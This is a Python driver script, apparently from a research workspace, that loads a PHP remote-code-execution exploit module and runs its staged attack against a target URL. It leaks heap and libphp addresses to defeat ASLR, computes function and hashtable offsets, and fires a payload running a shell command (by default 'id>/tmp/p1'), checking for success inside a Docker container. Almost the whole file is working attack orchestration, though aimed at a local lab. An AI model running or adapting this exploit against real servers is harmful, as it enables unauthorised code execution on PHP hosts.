#!/usr/bin/env python3
"""One-shot driver around the repo's Exploit class.

Same payloads as exploit.py; the only difference is proof detection, which
reads /tmp/p1 inside the container with `docker exec` (no host mounts).
Prints a machine-readable summary line: RESULT <json>.
"""
import argparse, importlib.util, json, subprocess, sys, time

REPO = "/tmp/opencode/research/9bie_aslr_20261022T095015Z/repo/exploit.py"

def load_exploit():
    spec = importlib.util.spec_from_file_location("php2shell_exploit", REPO)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod

def proof(container):
    r = subprocess.run(["docker", "exec", container, "cat", "/tmp/p1"],
                       capture_output=True, text=True)
    return r.stdout.strip() if r.returncode == 0 else ""

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--container", required=True)
    ap.add_argument("--url", required=True)
    ap.add_argument("--zif", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--dtor", type=lambda x: int(x, 0), required=True)
    ap.add_argument("--htdata", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--profile", default="bookworm")
    ap.add_argument("--cmd", default="id>/tmp/p1")
    ap.add_argument("--huge-mb", type=int, default=12)
    ap.add_argument("--retries", type=int, default=1)
    ap.add_argument("--skip-rotate", action="store_true")
    args = ap.parse_args()

    E = load_exploit()
    t = E.Target(args.url, verbose=True)
    htdata = args.htdata if args.htdata is not None else (E.BOOKWORM_HTDATA_OFFSET if args.profile == "bookworm" else E.HTDATA_OFFSET)
    ex = E.Exploit(t, args.cmd, zif_offset=args.zif, dtor_offset=args.dtor,
                   htdata_offset=htdata, huge_mb=args.huge_mb, profile=args.profile)
    out = {"container": args.container, "stages": {}, "proof": ""}
    subprocess.run(["docker", "exec", args.container, "rm", "-f", "/tmp/p1"])
    if not args.skip_rotate:
        ex.rotate()
    for stage in (1, 2):
        value = 0
        for attempt in range(1, args.retries + 1):
            print(f"[*] stage {stage} attempt {attempt}", flush=True)
            value = ex.stage1() if stage == 1 else ex.stage2()
            out["stages"][f"stage{stage}_attempts"] = attempt
            if value:
                break
            if not args.skip_rotate:
                ex.rotate()
        out["stages"][f"stage{stage}"] = hex(value) if value else "0x0"
        if not value:
            out["result"] = "FAIL"
            print("RESULT " + json.dumps(out))
            return 1
        if not args.skip_rotate:
            ex.rotate()
    chunk = int(out["stages"]["stage1"], 16)
    libphp = int(out["stages"]["stage2"], 16)
    ht = chunk + htdata
    zif = libphp + args.zif
    print(f"[*] stage 3: HTDATA=0x{ht:x} ZIF=0x{zif:x}", flush=True)
    for attempt in range(1, args.retries + 3):
        ex.stage3(ht, zif)
        time.sleep(0.8)
        p = proof(args.container)
        out["stages"]["stage3_attempts"] = attempt
        if p:
            out["proof"] = p
            out["result"] = "RCE"
            print("RESULT " + json.dumps(out))
            return 0
        print(f"[-] stage3 attempt {attempt}: no proof", flush=True)
        if not args.skip_rotate:
            ex.rotate()
    out["result"] = "NO_PROOF"
    print("RESULT " + json.dumps(out))
    return 1

if __name__ == "__main__":
    sys.exit(main())
